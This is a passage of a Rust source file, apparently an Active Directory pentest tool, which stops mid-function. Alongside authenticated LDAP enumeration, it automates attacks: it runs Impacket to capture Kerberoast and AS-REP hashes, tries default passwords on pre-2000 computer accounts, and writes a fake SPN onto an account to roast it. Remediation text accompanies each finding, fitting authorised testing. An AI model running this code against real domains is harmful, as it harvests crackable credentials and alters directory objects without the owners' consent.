use anyhow::Result;
use ldap3::controls::RawControl;
use ldap3::{LdapConnAsync, Mod, Scope, SearchEntry};
use serde::Serialize;
use std::collections::HashSet;
use std::env;
use std::fs;
use std::io::ErrorKind;
use std::io::{self, IsTerminal, Write};
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::process::Command;
use tokio::time::{timeout, Duration};

use crate::output;

#[derive(Debug, Clone, Serialize)]
pub struct AuthFinding {
    pub id: String,
    pub severity: String,
    pub title: String,
    pub evidence: String,
    pub recommendation: String,
}

#[derive(Debug, Default, Serialize)]
pub struct AuthReconResult {
    pub usernames: Vec<String>,
    pub findings: Vec<AuthFinding>,
    pub ldap_bind_ok: bool,
}

fn display_limited(items: &[String], limit: usize) -> String {
    if items.is_empty() {
        return String::new();
    }
    if items.len() <= limit {
        return items.join(", ");
    }
    let mut out = items
        .iter()
        .take(limit)
        .cloned()
        .collect::<Vec<_>>()
        .join(", ");
    out.push_str(", <snip>");
    out
}

fn auth_tag_selected(selected: &[String], tag: &str) -> bool {
    if selected.is_empty() {
        return true;
    }
    selected.iter().any(|t| t.eq_ignore_ascii_case(tag))
}

pub async fn run(
    target: &str,
    port: u16,
    username: &str,
    password: &str,
    domain: &str,
    selected_tags: &[String],
    non_interactive: bool,
) -> Result<AuthReconResult> {
    let mut result = AuthReconResult::default();
    let scheme = if port == 636 || port == 3269 {
        "ldaps"
    } else {
        "ldap"
    };
    let url = format!("{}://{}:{}", scheme, target, port);
    let base_dn = domain
        .split('.')
        .map(|part| format!("DC={}", part))
        .collect::<Vec<_>>()
        .join(",");

    output::section("AUTHENTICATED AD RECON");
    output::info(&format!("Connecting to {}", url));

    let (conn, mut ldap) = match LdapConnAsync::new(&url).await {
        Ok(c) => c,
        Err(e) => {
            output::fail(&format!("Authenticated LDAP connect failed: {}", e));
            return Ok(result);
        }
    };

    tokio::spawn(async move {
        if let Err(e) = conn.drive().await {
            eprintln!("LDAP connection error: {}", e);
        }
    });

    let mut bind_candidates = Vec::new();
    if username.contains('@') || username.contains('\\') {
        bind_candidates.push(username.to_string());
    } else {
        bind_candidates.push(format!("{}@{}", username, domain));
        let short = domain.split('.').next().unwrap_or(domain);
        bind_candidates.push(format!("{}\\{}", short, username));
        bind_candidates.push(username.to_string());
    }
    let mut seen = HashSet::new();
    bind_candidates.retain(|p| seen.insert(p.to_ascii_lowercase()));

    let mut bind_principal = String::new();
    let mut last_rc: Option<u32> = None;
    for principal in bind_candidates {
        let bind = ldap.simple_bind(&principal, password).await?;
        if bind.rc == 0 {
            bind_principal = principal;
            break;
        }
        last_rc = Some(bind.rc);
    }
    if bind_principal.is_empty() {
        let rc = last_rc
            .map(|v| v.to_string())
            .unwrap_or_else(|| "unknown".to_string());
        output::fail(&format!("Authenticated LDAP bind rejected (rc: {})", rc));
        let _ = ldap.unbind().await;
        return Ok(result);
    }
    result.ldap_bind_ok = true;
    output::success("Authenticated LDAP bind successful");
    output::kv("LDAP Bind Principal", &bind_principal);

    result.usernames = collect_usernames(&mut ldap, &base_dn).await?;
    output::success(&format!(
        "Authenticated collection: {} usernames",
        result.usernames.len()
    ));
    if !result.usernames.is_empty() {
        output::kv("Usernames", &display_limited(&result.usernames, 10));
    }

    let mut spn_users = Vec::new();
    if auth_tag_selected(selected_tags, "kerberoast") {
        spn_users = collect_spn_kerberoast(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    let mut asrep_users = Vec::new();
    if auth_tag_selected(selected_tags, "asreproast") {
        asrep_users = collect_asrep_roastable(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    let mut pre2k_candidates = Vec::new();
    if auth_tag_selected(selected_tags, "pre2k") {
        pre2k_candidates =
            collect_pre2k_candidates(&mut ldap, &base_dn, &mut result.findings).await?;
    }

    if auth_tag_selected(selected_tags, "delegation") {
        collect_delegation_findings(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "enum-trusts") {
        collect_trust_findings(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "dcsync") {
        collect_dcsync_heuristics(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "adcs") {
        collect_adcs_template_heuristics(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "maq") {
        collect_machine_account_quota(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "pso") {
        collect_pso(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "dump-computers")
        || auth_tag_selected(selected_tags, "obsolete")
    {
        collect_computer_inventory(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "subnets") {
        collect_subnets_sites(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "sccm") {
        collect_sccm_hints(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "entra-id") {
        collect_entra_id_hints(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "get-desc-users")
        || auth_tag_selected(selected_tags, "user-desc")
        || auth_tag_selected(selected_tags, "get-info-users")
        || auth_tag_selected(selected_tags, "get-userpassword")
        || auth_tag_selected(selected_tags, "get-unixuserpassword")
    {
        collect_user_attr_hints(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "whoami")
        || auth_tag_selected(selected_tags, "groupmembership")
        || auth_tag_selected(selected_tags, "groups")
    {
        collect_group_membership_whoami(&mut ldap, &base_dn, &bind_principal, &mut result.findings)
            .await?;
    }
    if auth_tag_selected(selected_tags, "groups") {
        collect_groups_inventory(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "dns-nonsecure") {
        collect_dns_nonsecure_updates(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "get-network") {
        collect_network_dns_inventory(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "daclread") {
        collect_dacl_readability(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "badsuccessor") {
        collect_badsuccessor_heuristics(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "deleted-accounts") {
        collect_deleted_recoverable_accounts(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "laps") {
        collect_laps_readability(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "adcs") {
        collect_adcs_enrollment_services(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "gpo") {
        collect_gpo_inventory(&mut ldap, &base_dn, &mut result.findings).await?;
    }
    if auth_tag_selected(selected_tags, "priv-routes") {
        collect_user_privilege_routes(&mut ldap, &base_dn, &bind_principal, &mut result.findings)
            .await?;
    }

    if auth_tag_selected(selected_tags, "kerberoast") {
        attempt_impacket_kerberoast(
            target,
            domain,
            username,
            password,
            &spn_users,
            &mut result.findings,
        )
        .await;
    }

    if auth_tag_selected(selected_tags, "asreproast") {
        let mut asrep_try = asrep_users.clone();
        if asrep_try.len() < 500 {
            asrep_try.extend(result.usernames.iter().take(500 - asrep_try.len()).cloned());
            asrep_try.sort();
            asrep_try.dedup();
        }
        attempt_impacket_asrep(target, domain, &asrep_try, &mut result.findings).await;
    }
    if auth_tag_selected(selected_tags, "pre2k") {
        attempt_pre2k_tgt(target, domain, &pre2k_candidates, &mut result.findings).await;
    }
    if auth_tag_selected(selected_tags, "adcs") || auth_tag_selected(selected_tags, "certipy") {
        attempt_certipy_find(target, domain, username, password, &mut result.findings).await;
    }
    if auth_tag_selected(selected_tags, "raisechild") {
        attempt_raisechild(target, domain, username, password, &mut result.findings).await;
    }
    if auth_tag_selected(selected_tags, "kerberoast") && spn_write_abuse_candidate(&result.findings)
    {
        maybe_prompt_fake_spn_roast(
            &mut ldap,
            target,
            domain,
            username,
            password,
            &base_dn,
            &mut result.findings,
            non_interactive,
        )
        .await?;
    }

    output::info(&format!(
        "Authenticated findings generated: {}",
        result.findings.len()
    ));

    let _ = ldap.unbind().await;
    Ok(result)
}

fn spn_write_abuse_candidate(findings: &[AuthFinding]) -> bool {
    findings.iter().any(|f| {
        matches!(
            f.id.as_str(),
            "AUTH-PRIV-ROUTES" | "AUTH-DACLREAD-DOMAIN" | "AUTH-DCSYNC-HEURISTIC"
        )
    })
}

fn normalize_sam(username: &str) -> String {
    if let Some((left, _)) = username.split_once('@') {
        return left.to_string();
    }
    if let Some((_, right)) = username.split_once('\\') {
        return right.to_string();
    }
    username.to_string()
}

fn confirm_fake_spn_attempt(non_interactive: bool) -> bool {
    if non_interactive || !io::stdin().is_terminal() {
        return false;
    }
    print!(
        "  [*] Potential SPN write abuse path detected. Attempt fake SPN write + roast? [y/N]: "
    );
    let _ = io::stdout().flush();
    let mut line = String::new();
    if io::stdin().read_line(&mut line).is_err() {
        return false;
    }
    matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes")
}

fn read_hash_preview(path: &str, limit: usize) -> Option<String> {
    let content = fs::read_to_string(path).ok()?;
    let lines = content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(ToOwned::to_owned)
        .collect::<Vec<_>>();
    if lines.is_empty() {
        return None;
    }
    if lines.len() <= limit {
        return Some(lines.join(" | "));
    }
    let mut out = lines[..limit].join(" | ");
    out.push_str(" | <snip>");
    Some(out)
}

async fn maybe_prompt_fake_spn_roast(
    ldap: &mut ldap3::Ldap,
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
    non_interactive: bool,
) -> Result<()> {
    if !confirm_fake_spn_attempt(non_interactive) {
        output::info("Skipped fake SPN write abuse attempt");
        return Ok(());
    }

    let sam = normalize_sam(username);
    let user_filter = format!("(&(objectClass=user)(sAMAccountName={}))", sam);
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            &user_filter,
            vec!["distinguishedName"],
        )
        .await?;
    let (entries, _) = query.success()?;
    if entries.is_empty() {
        output::warning("Could not resolve LDAP user object for fake SPN attempt");
        return Ok(());
    }
    let user_dn = SearchEntry::construct(entries[0].clone()).dn;

    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let fake_spn = format!("aydee/{sam}-{stamp}");

    let mut add_vals: HashSet<&str> = HashSet::new();
    add_vals.insert(fake_spn.as_str());
    let add_res = ldap
        .modify(&user_dn, vec![Mod::Add("servicePrincipalName", add_vals)])
        .await;
    match add_res {
        Ok(r) if r.rc == 0 => {
            output::success(&format!("Fake SPN written on {}: {}", sam, fake_spn));
        }
        Ok(r) => {
            output::warning(&format!(
                "SPN write denied/failed (rc={}) — skipping fake SPN roast",
                r.rc
            ));
            return Ok(());
        }
        Err(e) => {
            output::warning(&format!(
                "SPN write failed ({}) — skipping fake SPN roast",
                e
            ));
            return Ok(());
        }
    }

    let output_file = "kerberoast_fake_spn_hashes.txt";
    let bins = ["GetUserSPNs.py", "impacket-GetUserSPNs"];
    let mut roast_preview = None;
    let mut tool_used = None;

    for bin in bins {
        let mut cmd = Command::new(bin);
        cmd.arg("-request")
            .arg("-request-user")
            .arg(&sam)
            .arg("-dc-ip")
            .arg(target)
            .arg("-outputfile")
            .arg(output_file)
            .arg(format!("{}/{}:{}", domain, username, password));

        match timeout(Duration::from_secs(60), cmd.output()).await {
            Ok(Ok(out)) if out.status.success() => {
                roast_preview = read_hash_preview(output_file, 5);
                tool_used = Some(bin.to_string());
                break;
            }
            Ok(Ok(_)) => continue,
            Ok(Err(_)) => continue,
            Err(_) => {
                output::warning(&format!("{} timed out during fake SPN roast request", bin));
            }
        }
    }

    let mut del_vals: HashSet<&str> = HashSet::new();
    del_vals.insert(fake_spn.as_str());
    let del_res = ldap
        .modify(
            &user_dn,
            vec![Mod::Delete("servicePrincipalName", del_vals)],
        )
        .await;
    match del_res {
        Ok(r) if r.rc == 0 => {
            output::success("Fake SPN cleanup completed");
        }
        _ => {
            output::warning(&format!(
                "Failed to clean fake SPN automatically: {} (remove manually from {})",
                fake_spn, sam
            ));
        }
    }

    if let Some(preview) = roast_preview {
        output::success("Fake SPN roast succeeded");
        output::kv("Fake SPN Hashes", &preview);
        findings.push(AuthFinding {
            id: "AUTH-FAKE-SPN-WRITE-ROAST".to_string(),
            severity: "critical".to_string(),
            title: "Fake SPN write + Kerberoast succeeded".to_string(),
            evidence: format!(
                "Target user={} | Fake SPN={} | Tool={} | Output={} | {}",
                sam,
                fake_spn,
                tool_used.unwrap_or_else(|| "<unknown>".to_string()),
                output_file,
                preview
            ),
            recommendation: "Restrict SPN write rights (validated write / write servicePrincipalName), rotate affected credentials, and review ACL delegation."
                .to_string(),
        });
    } else {
        output::warning("Fake SPN was written but no Kerberoast hash was captured");
    }

    Ok(())
}

async fn collect_usernames(ldap: &mut ldap3::Ldap, base_dn: &str) -> Result<Vec<String>> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(&(objectCategory=person)(objectClass=user)(sAMAccountName=*))",
            vec!["sAMAccountName"],
        )
        .await?;
    let (entries, _) = query.success()?;
    let mut users = Vec::new();

    for entry in entries {
        let entry = SearchEntry::construct(entry);
        if let Some(vals) = entry.attrs.get("sAMAccountName") {
            for v in vals {
                if !v.is_empty() {
                    users.push(v.clone());
                }
            }
        }
    }

    users.sort_by_key(|u| u.to_lowercase());
    users.dedup_by(|a, b| a.eq_ignore_ascii_case(b));
    Ok(users)
}

async fn collect_spn_kerberoast(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<Vec<String>> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
            vec!["sAMAccountName", "servicePrincipalName", "description"],
        )
        .await?;
    let (entries, _) = query.success()?;

    let mut spn_accounts = 0usize;
    let mut spn_users = Vec::new();
    let mut sample = Vec::new();
    for entry in entries {
        let entry = SearchEntry::construct(entry);
        let user = entry
            .attrs
            .get("sAMAccountName")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        let desc = entry
            .attrs
            .get("description")
            .and_then(|v| v.first())
            .cloned();
        let spn_count = entry
            .attrs
            .get("servicePrincipalName")
            .map(|v| v.len())
            .unwrap_or(0);
        if spn_count > 0 {
            spn_accounts += 1;
            spn_users.push(user.clone());
            if sample.len() < 12 {
                if let Some(d) = desc {
                    sample.push(format!("{}({} SPN, desc={})", user, spn_count, d));
                } else {
                    sample.push(format!("{}({} SPN)", user, spn_count));
                }
            }
        }
    }

    if spn_accounts > 0 {
        findings.push(AuthFinding {
            id: "AUTH-KERBEROAST-CANDIDATES".to_string(),
            severity: "medium".to_string(),
            title: "Kerberoast candidate service accounts found".to_string(),
            evidence: format!(
                "{} user accounts with SPN. Sample: {}",
                spn_accounts,
                display_limited(&sample, 10)
            ),
            recommendation: "Review service account password strength/rotation, move to gMSA where possible, and monitor TGS abuse patterns.".to_string(),
        });
    }
    spn_users.sort();
    spn_users.dedup();
    Ok(spn_users)
}

async fn collect_asrep_roastable(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<Vec<String>> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            vec!["sAMAccountName", "description"],
        )
        .await?;
    let (entries, _) = query.success()?;

    let mut users = Vec::new();
    let mut sample = Vec::new();
    for entry in entries {
        let entry = SearchEntry::construct(entry);
        if let Some(u) = entry.attrs.get("sAMAccountName").and_then(|v| v.first()) {
            users.push(u.clone());
            if sample.len() < 12 {
                if let Some(d) = entry.attrs.get("description").and_then(|v| v.first()) {
                    sample.push(format!("{}(desc={})", u, d));
                } else {
                    sample.push(u.clone());
                }
            }
        }
    }

    if !users.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-ASREP-ROASTABLE".to_string(),
            severity: "high".to_string(),
            title: "AS-REP roastable user accounts found".to_string(),
            evidence: format!("{} users: {}", users.len(), display_limited(&sample, 10)),
            recommendation:
                "Enable Kerberos pre-authentication for these users and rotate credentials."
                    .to_string(),
        });
    }
    Ok(users)
}

async fn collect_pre2k_candidates(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<Vec<String>> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))",
            vec!["sAMAccountName", "pwdLastSet", "lastLogonTimestamp", "description"],
        )
        .await?;
    let (entries, _) = query.success()?;

    let mut candidates = Vec::new();
    let mut sample = Vec::new();
    for entry in entries {
        let e = SearchEntry::construct(entry);
        if let Some(name) = e.attrs.get("sAMAccountName").and_then(|v| v.first()) {
            candidates.push(name.clone());
            if sample.len() < 12 {
                let pls = e
                    .attrs
                    .get("pwdLastSet")
                    .and_then(|v| v.first())
                    .cloned()
                    .unwrap_or_else(|| "0".to_string());
                let llt = e
                    .attrs
                    .get("lastLogonTimestamp")
                    .and_then(|v| v.first())
                    .cloned()
                    .unwrap_or_else(|| "0".to_string());
                let desc = e
                    .attrs
                    .get("description")
                    .and_then(|v| v.first())
                    .cloned()
                    .unwrap_or_default();
                sample.push(format!("{}(pwdLastSet={},lastLogon={})", name, pls, llt));
                if !desc.is_empty() {
                    sample.push(format!("{}(desc={})", name, desc));
                }
            }
        }
    }

    if !candidates.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-PRE2K-CANDIDATES".to_string(),
            severity: "high".to_string(),
            title: "Potential pre2k machine-account candidates found".to_string(),
            evidence: format!(
                "{} candidates. Sample: {}",
                candidates.len(),
                display_limited(&sample, 10)
            ),
            recommendation: "Review/disable stale pre-created computer accounts and enforce secure machine account provisioning."
                .to_string(),
        });
    }
    Ok(candidates)
}

async fn collect_delegation_findings(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let unconstrained = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
            vec!["sAMAccountName", "dNSHostName"],
        )
        .await?
        .success()?
        .0
        .len();

    if unconstrained > 0 {
        findings.push(AuthFinding {
            id: "AUTH-DELEGATION-UNCONSTRAINED".to_string(),
            severity: "high".to_string(),
            title: "Unconstrained delegation principals found".to_string(),
            evidence: format!("{} objects with TRUSTED_FOR_DELEGATION flag", unconstrained),
            recommendation: "Remove unconstrained delegation where possible; prefer constrained or resource-based delegation.".to_string(),
        });
    }

    let constrained = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(msDS-AllowedToDelegateTo=*)",
            vec!["sAMAccountName", "msDS-AllowedToDelegateTo"],
        )
        .await?
        .success()?
        .0
        .len();
    if constrained > 0 {
        findings.push(AuthFinding {
            id: "AUTH-DELEGATION-CONSTRAINED".to_string(),
            severity: "medium".to_string(),
            title: "Constrained delegation principals found".to_string(),
            evidence: format!("{} objects with msDS-AllowedToDelegateTo", constrained),
            recommendation:
                "Validate constrained delegation scope and remove stale delegation entries."
                    .to_string(),
        });
    }

    let rbcd = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
            vec!["sAMAccountName", "dNSHostName"],
        )
        .await?
        .success()?
        .0
        .len();
    if rbcd > 0 {
        findings.push(AuthFinding {
            id: "AUTH-DELEGATION-RBCD".to_string(),
            severity: "high".to_string(),
            title: "RBCD-configured computer objects found".to_string(),
            evidence: format!(
                "{} objects with msDS-AllowedToActOnBehalfOfOtherIdentity",
                rbcd
            ),
            recommendation:
                "Review RBCD ACLs and machine account control paths for unintended privilege escalation."
                    .to_string(),
        });
    }
    Ok(())
}

async fn collect_user_privilege_routes(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    bind_principal: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let user_filter = if bind_principal.contains('@') {
        let user = bind_principal.split('@').next().unwrap_or(bind_principal);
        format!("(&(objectClass=user)(sAMAccountName={}))", user)
    } else if bind_principal.contains('\\') {
        let user = bind_principal
            .split('\\')
            .next_back()
            .unwrap_or(bind_principal);
        format!("(&(objectClass=user)(sAMAccountName={}))", user)
    } else {
        format!("(&(objectClass=user)(sAMAccountName={}))", bind_principal)
    };

    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            &user_filter,
            vec!["memberOf", "distinguishedName"],
        )
        .await?;
    let (entries, _) = query.success()?;
    if entries.is_empty() {
        return Ok(());
    }
    let entry = SearchEntry::construct(entries[0].clone());
    let groups = entry.attrs.get("memberOf").cloned().unwrap_or_default();
    if groups.is_empty() {
        return Ok(());
    }

    let interesting = [
        "Domain Admins",
        "Enterprise Admins",
        "Administrators",
        "Account Operators",
        "Server Operators",
        "Backup Operators",
        "Group Policy Creator Owners",
    ];

    let mut routes = Vec::new();
    for g in groups {
        for k in interesting {
            if g.to_ascii_lowercase().contains(&k.to_ascii_lowercase()) {
                routes.push(k.to_string());
            }
        }
    }
    routes.sort();
    routes.dedup();

    if !routes.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-PRIV-ROUTES".to_string(),
            severity: "high".to_string(),
            title: "Authenticated principal has high-privilege group routes".to_string(),
            evidence: format!("Potential outbound privilege routes via groups: {}", routes.join(", ")),
            recommendation: "Review least privilege and group nesting; reduce direct membership in privileged groups."
                .to_string(),
        });
    }
    Ok(())
}

async fn attempt_impacket_kerberoast(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    spn_users: &[String],
    findings: &mut Vec<AuthFinding>,
) {
    if spn_users.is_empty() {
        return;
    }
    let output_file = "kerberoast_hashes.txt";
    let bins = ["GetUserSPNs.py", "impacket-GetUserSPNs"];
    for bin in bins {
        let mut cmd = Command::new(bin);
        cmd.arg("-request")
            .arg("-dc-ip")
            .arg(target)
            .arg("-outputfile")
            .arg(output_file)
            .arg(format!("{}/{}:{}", domain, username, password));

        match timeout(Duration::from_secs(60), cmd.output()).await {
            Err(_) => continue,
            Ok(Err(_)) => continue,
            Ok(Ok(out)) if out.status.success() => {
                findings.push(AuthFinding {
                    id: "AUTH-KERBEROAST-HASHES".to_string(),
                    severity: "high".to_string(),
                    title: "Kerberoast hashes captured via Impacket".to_string(),
                    evidence: format!("Output file: {}", output_file),
                    recommendation: "Treat captured TGS hashes as sensitive; rotate service account credentials."
                        .to_string(),
                });
                return;
            }
            Ok(_) => continue,
        }
    }
}

async fn attempt_impacket_asrep(
    target: &str,
    domain: &str,
    asrep_users: &[String],
    findings: &mut Vec<AuthFinding>,
) {
    if asrep_users.is_empty() {
        return;
    }

    let mut users_path: PathBuf = env::temp_dir();
    users_path.push("aydee_asrep_users.txt");
    if fs::write(&users_path, asrep_users.join("\n")).is_err() {
        return;
    }

    let output_file = "asreproast_hashes.txt";
    let bins = ["GetNPUsers.py", "impacket-GetNPUsers"];
    for bin in bins {
        let mut cmd = Command::new(bin);
        cmd.arg(format!("{}/", domain))
            .arg("-dc-ip")
            .arg(target)
            .arg("-usersfile")
            .arg(users_path.to_string_lossy().to_string())
            .arg("-format")
            .arg("hashcat")
            .arg("-outputfile")
            .arg(output_file)
            .arg("-no-pass");

        match timeout(Duration::from_secs(60), cmd.output()).await {
            Err(_) => continue,
            Ok(Err(_)) => continue,
            Ok(Ok(out)) if out.status.success() => {
                findings.push(AuthFinding {
                    id: "AUTH-ASREP-HASHES".to_string(),
                    severity: "high".to_string(),
                    title: "AS-REP roast hashes captured via Impacket".to_string(),
                    evidence: format!("Output file: {}", output_file),
                    recommendation:
                        "Treat captured AS-REP hashes as sensitive and enforce pre-auth for impacted users."
                            .to_string(),
                });
                return;
            }
            Ok(_) => continue,
        }
    }
}

async fn attempt_pre2k_tgt(
    target: &str,
    domain: &str,
    pre2k_candidates: &[String],
    findings: &mut Vec<AuthFinding>,
) {
    if pre2k_candidates.is_empty() {
        return;
    }

    let bins = ["getTGT.py", "impacket-getTGT"];
    let mut successes = Vec::new();

    for comp in pre2k_candidates.iter().take(32) {
        let machine = comp.trim_end_matches('$');
        if machine.is_empty() {
            continue;
        }
        let default_pwd = machine.to_ascii_lowercase();
        let principal = format!("{}/{}$:{}", domain, machine, default_pwd);

        let mut worked = false;
        for bin in bins {
            let mut cmd = Command::new(bin);
            cmd.arg("-dc-ip").arg(target).arg(&principal);
            if let Ok(Ok(out)) = timeout(Duration::from_secs(30), cmd.output()).await {
                if out.status.success() {
                    worked = true;
                    break;
                }
            }
        }

        if worked {
            successes.push(format!("{}$ / {}", machine, default_pwd));
        }
    }

    if !successes.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-PRE2K-DEFAULTPWD-SUCCESS".to_string(),
            severity: "critical".to_string(),
            title: "Pre2k default machine password authentication succeeded".to_string(),
            evidence: format!("Successful principals: {}", successes.join(", ")),
            recommendation:
                "Immediately reset impacted computer account passwords and audit machine pre-staging controls."
                    .to_string(),
        });
    }
}

async fn collect_trust_findings(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(objectClass=trustedDomain)",
            vec![
                "cn",
                "trustPartner",
                "trustDirection",
                "trustType",
                "trustAttributes",
            ],
        )
        .await?;
    let (entries, _) = query.success()?;

    if !entries.is_empty() {
        let mut sample = Vec::new();
        for e in entries.iter().take(8) {
            let entry = SearchEntry::construct(e.clone());
            let partner = entry
                .attrs
                .get("trustPartner")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_else(|| "<unknown>".to_string());
            let direction = entry
                .attrs
                .get("trustDirection")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_else(|| "?".to_string());
            sample.push(format!("{}(dir={})", partner, direction));
        }
        findings.push(AuthFinding {
            id: "AUTH-TRUST-MAPPING".to_string(),
            severity: "info".to_string(),
            title: "Domain trust objects discovered".to_string(),
            evidence: format!(
                "{} trust objects. Sample: {}",
                entries.len(),
                sample.join(", ")
            ),
            recommendation:
                "Validate trust direction, SID filtering, and selective authentication settings."
                    .to_string(),
        });
    }
    Ok(())
}

async fn collect_dcsync_heuristics(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let mut risky_groups = Vec::new();
    let mut sampled_members = Vec::new();
    for group in [
        "Domain Admins",
        "Enterprise Admins",
        "Administrators",
        "Domain Controllers",
        "Replicator",
    ] {
        let filter = format!("(&(objectClass=group)(cn={}))", group);
        let query = ldap
            .search(
                base_dn,
                Scope::Subtree,
                &filter,
                vec!["member", "distinguishedName"],
            )
            .await?;
        let (entries, _) = query.success()?;
        for entry in entries {
            let entry = SearchEntry::construct(entry);
            let member_vals = entry.attrs.get("member").cloned().unwrap_or_default();
            let members = member_vals.len();
            if members > 0 {
                risky_groups.push(format!("{}({} members)", group, members));
                for m in member_vals.into_iter().take(6) {
                    if sampled_members.len() < 20 {
                        sampled_members.push(m);
                    }
                }
            }
        }
    }

    if !risky_groups.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-DCSYNC-HEURISTIC".to_string(),
            severity: "medium".to_string(),
            title: "Privileged groups that commonly imply replication rights found".to_string(),
            evidence: format!(
                "{} | Sample principals: {}",
                risky_groups.join(", "),
                sampled_members.join(" ; ")
            ),
            recommendation:
                "Review delegated replication rights (DS-Replication-Get-Changes*) and privileged group membership for non-tier-0 principals."
                    .to_string(),
        });
    }
    Ok(())
}

async fn collect_adcs_template_heuristics(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let config_dn = format!("CN=Configuration,{}", base_dn);
    let template_base = format!(
        "CN=Certificate Templates,CN=Public Key Services,CN=Services,{}",
        config_dn
    );

    let query = ldap
        .search(
            &template_base,
            Scope::OneLevel,
            "(objectClass=pKICertificateTemplate)",
            vec![
                "cn",
                "msPKI-Enrollment-Flag",
                "msPKI-Certificate-Name-Flag",
                "pKIExtendedKeyUsage",
                "msPKI-RA-Signature",
            ],
        )
        .await;

    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };

    if entries.is_empty() {
        return Ok(());
    }

    let mut risky = Vec::new();
    for entry in entries.iter() {
        let e = SearchEntry::construct(entry.clone());
        let name = e
            .attrs
            .get("cn")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        let enrollee_flag = e
            .attrs
            .get("msPKI-Certificate-Name-Flag")
            .and_then(|v| v.first())
            .and_then(|v| v.parse::<u32>().ok())
            .unwrap_or(0);
        let enrollment_flag = e
            .attrs
            .get("msPKI-Enrollment-Flag")
            .and_then(|v| v.first())
            .and_then(|v| v.parse::<u32>().ok())
            .unwrap_or(0);
        let ra_sig = e
            .attrs
            .get("msPKI-RA-Signature")
            .and_then(|v| v.first())
            .and_then(|v| v.parse::<u32>().ok())
            .unwrap_or(0);
        let ekus = e
            .attrs
            .get("pKIExtendedKeyUsage")
            .cloned()
            .unwrap_or_default();

        let enrollee_supplies_subject = (enrollee_flag & 0x1) != 0;
        let requires_manager_approval = (enrollment_flag & 0x2) != 0;
